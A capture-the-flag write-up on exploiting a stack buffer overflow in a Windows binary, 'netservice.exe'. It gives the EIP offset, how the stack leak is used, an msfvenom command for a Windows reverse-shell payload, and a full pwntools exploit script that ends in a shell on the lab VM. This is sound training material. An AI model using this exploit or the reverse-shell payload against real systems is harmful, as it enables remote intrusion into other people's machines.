# Windows2 CTF Writeup

## Challenge Overview

The challenge involved exploiting a Windows binary named `netservice.exe` with the goal of achieving a reverse shell to the attacker's machine. The binary contained a vulnerability where user input was written directly into a buffer without bounds checking, enabling a classic buffer overflow.

## Analysis

When running the binary, it prompted for input. Upon analysis using tools for example **Ghidra** it was discovered that the input was copied into a stack buffer without proper checks, while also leaking a stack address beforehand which we could use in advance.

The program printed a stack address in the following format:

```
Stack leak: 0x64eec0
```

After this leak, sending an overly long input crashed the binary. Using `cyclic()` and `cyclic_find()` from pwntools, we determined the exact offset to EIP.

### Key Code Analysis

Relevant disassembly snippets:

```asm
mov eax, [esp+4]
call gets  ; unsafe, no length check
```

And:

```asm
printf("Stack leak: %p\n", esp + 0x20)
```

The combination of a stack leak and unsafe input makes this binary vulnerable to classic buffer overflow with shellcode injection.

## Exploitation and Payload Strategy

### Step 1: Finding the Offset

Sending a long `cyclic()` string crashed the binary and overwrote EIP. The crash value (`0x61647062`) indicated an offset of `4108` bytes:

```python
cyclic_find(0x61647062)  # â†’ 4108
```

### Step 2: Using the Stack Leak

The program leaked a stack address. By placing a NOP sled and shellcode at that location, we could redirect EIP to the shellcode reliably.

```python
target_eip = p32(stack_leak + 16)
```

### Step 3: Generating Shellcode

A reverse shell was generated using `msfvenom`:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.196 LPORT=4444 EXITFUNC=thread -f python -b "\x00\x0a\x0d"
```

This shellcode was appended after a NOP sled, right after the EIP overwrite.

### Final Payload:

```python
payload = b"A" * 4108
payload += target_eip
payload += b"\x90" * 32
payload += shellcode
```

The exploit was sent via a script that connects to the vulnerable binary on the VM over port 1234.

### Python Automation Script:

```python
from pwn import *

conn = remote("192.168.1.108", 1234)
stack_leak = int(conn.recvline().strip().split(b': ')[1], 16)

offset = 4108
nop_sled = b'\x90' * 32

target_eip = p32(stack_leak + 16)

payload = b"A" * offset + target_eip + nop_sled + buf

input("Start netcat listener and press Enter...")
conn.sendline(payload)
conn.interactive()
```

## Result and Solution

By sending the payload and simultaneously running a netcat listener on port 4444, we successfully obtained a reverse shell on the VM. The shell ran in the context of the user who started `netservice.exe`.

```bash
ncat -lvnp 4444
```

In the shell:

```cmd
C:\Users\nali> whoami
desktop-m94ck2e
```

## Conclusion and Lessons

- Stack leaks can be leveraged to accurately target NOP sleds.
- Classic buffer overflows remain powerful when input is not properly validated.
- Using `gets()` in modern binaries is a severe risk.
- This challenge reinforced knowledge of offset calculation, shellcode injection, and building reliable exploits.
